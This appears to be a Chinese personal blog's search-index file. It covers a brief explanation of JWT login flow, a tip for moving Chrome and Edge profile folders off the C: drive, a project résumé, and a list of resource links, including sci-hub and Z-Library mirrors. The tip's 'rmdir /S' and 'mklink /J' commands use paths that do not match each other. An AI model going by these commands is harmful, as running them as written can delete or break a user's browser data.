<p>在基于 JWT 进行身份验证的的应用程序中，服务器通过 Payload、Header 和 Secret(密钥)创建 JWT 并将 JWT 发送给客户端。客户端接收到 JWT 之后，会将其保存在 Cookie 或者 localStorage 里面，以后客户端发出的所有请求都会携带这个令牌。</p>
<p>简化后的步骤如下：</p>
<ol>
<li class="lvl-3">
<p>用户向服务器发送用户名、密码以及验证码用于登陆系统。</p>
</li>
<li class="lvl-3">
<p>如果用户用户名、密码以及验证码校验正确的话，服务端会返回已经签名的 Token，也就是 JWT。</p>
</li>
<li class="lvl-3">
<p>用户以后每次向后端发请求都在 Header 中带上这个 JWT 。</p>
</li>
<li class="lvl-3">
<p>服务端检查 JWT 并从中获取用户相关信息。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/21/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AE%E3%80%81%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1>1 C盘满</h1>
<p>在你想要存放数据的盘符下创建文件夹，假设为E:\Google Chrome\User Data<br>
把已经存在的User Data数据复制到E:\Google Chrome\中开始-&gt;附件-&gt;命令提示符（右键以管理员身份运行）输入CD C:\Users\用户名\AppData\Local\Google\Chrome<br>
输入RMDIR /S “User Data”，提示是否删除输入Y<br>
输入MKLINK /J “User Data” “E:\Google\Chrome”<br>
重启浏览器，大功告成。</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">rmdir <span class="string">/S</span> <span class="string">&quot;C:\Users\16325\AppData\Local\Microsoft\Edge\User Data&quot;</span></span><br><span class="line">mklink <span class="string">/J</span> <span class="string">&quot;C:\Users\16325\AppData\Local\Microsoft\Edge&quot;</span> <span class="string">&quot;F:\Cache\Edge&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>关于我</title>
    <url>/about/index.html</url>
    <content><![CDATA[<h2 id="项目经历">项目经历</h2>
<h3 id="l-异步电路EDA">l 异步电路EDA</h3>
<blockquote>
<p>参与兰州大学异步电路与系统实验室（LZU-ARC）的PinTu项目（面向FPGA ASIC的全异步开源EDA工具链），目前开源到启智平台（OpenI，新一代人工智能开源开放平台）。主要完成对项目源码的部分分析工作，形成介绍文档。对整个项目的整体介绍及部署开源工作。</p>
</blockquote>
<h3 id="l-基于语音识别的校园文明规范系统">l 基于语音识别的校园文明规范系统</h3>
<blockquote>
<p>基于语音识别技术，识别出敏感词、暴力词汇等内容，触发报警或提醒装置，来帮助规范针对中小学生的欺凌、霸凌等校园安全问题。后端对数据进行分析处理，前端对数据进行分析展示，显示校园安全问题易发生场所，及预警次数等信息。</p>
</blockquote>
<h3 id="l-基于微信小程序的资源共享平台">l 基于微信小程序的资源共享平台</h3>
<blockquote>
<p>基于小程序云开发提供的存储、数据库、云函数实现资源共享平台，用户可以进行文件上传、文件下载，下载后对文件预览等操作，通过积分机制鼓励用户进行资源共享。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>Categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Lab</title>
    <url>/lab/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/help/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>网站资源</title>
    <url>/links/index.html</url>
    <content><![CDATA[<h1>素材：</h1>
<ul class="lvl-0">
<li class="lvl-2">前端模板
<ul class="lvl-2">
<li class="lvl-4"><a href="https://www.jq22.com/">jQuery插件库(前端模板)</a></li>
</ul>
</li>
<li class="lvl-2">游戏
<ul class="lvl-2">
<li class="lvl-4"><a href="https://www.aigei.com/">爱给网(音效、配乐、游戏)</a></li>
</ul>
</li>
</ul>
<h1>工具：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>pdf资源下载</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://2lib.org/?signAll=1&amp;ts=1028">Zlibrary(英文电子书)</a></li>
<li class="lvl-4"><a href="https://www.jiumodiary.com/">鸠摩搜索</a></li>
</ul>
</li>
<li class="lvl-2">
<p>思维导图</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://www.processon.com/mindmap/603cb6aa07912913b4f36d4c">Process on</a></li>
</ul>
</li>
<li class="lvl-2">
<p>论文</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://linggle.com/">linggle</a></li>
</ul>
<blockquote>
<p>词组搭配、近义词、高频词汇查询</p>
</blockquote>
<ul class="lvl-2">
<li class="lvl-4">
<p><a href="https://www.sci-hub.ren/">sci-hub</a></p>
</li>
</ul>
<blockquote>
<p>文献下载</p>
</blockquote>
<ul class="lvl-2">
<li class="lvl-4">
<p><a href="https://ac.scmor.com/">谷歌学术镜像</a></p>
</li>
</ul>
</li>
<li class="lvl-2">
<p>翻译</p>
<p><a href="https://www.deepl.com/translator">DeepL</a></p>
</li>
<li class="lvl-2">
<p>音频</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://www.apowersoft.cn/compress-video-online">apowersoft(在线视频压缩)</a></li>
<li class="lvl-4"><a href="https://www.apowersoft.cn/free-online-audio-editor">apowersoft(在线音频编辑)</a></li>
<li class="lvl-4"><a href="https://www.youcompress.com/videos/">youcompress(音频压缩)</a></li>
</ul>
</li>
</ul>
<h1>网站：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://mp.weixin.qq.com/wxamp/home/guide?lang=zh_CN&amp;token=968434199">微信公众平台-小程序</a></p>
</li>
<li class="lvl-2">
<p><a href="https://echarts.apache.org/zh/tutorial.html#5%20%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B%20ECharts">ECharts</a></p>
<blockquote>
<p>ECharts 是一个使用 JavaScript 实现的开源可视化库，涵盖各行业图表，满足各种需求。</p>
</blockquote>
</li>
<li class="lvl-2">
<p>插件</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://www.youxiaohou.com/install.html">安装下载助手 | 油小猴 (youxiaohou.com)</a></li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Schedule</title>
    <url>/schedule/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
